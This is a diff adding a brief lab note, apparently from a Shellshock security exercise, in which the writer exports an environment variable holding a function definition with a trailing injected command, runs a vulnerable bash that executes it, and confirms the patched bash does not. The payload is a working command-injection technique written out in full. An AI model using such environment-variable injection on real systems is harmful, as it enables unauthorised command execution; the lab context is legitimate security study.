@@ -1,0 +1,11 @@
+I defined an environment variable 'foo' as such:
+$ foo = "() { hello world; }; ls -al /home/seed"
+$ export foo
+$ /bin/bash_shellshock
+
+I got a listing of my home directory immediately. Next I did:
+$ <Ctrl-D>
+$ /bin/bash
+
+I received no directory listing this time. So the /bin/bash is not
+vulnerable.
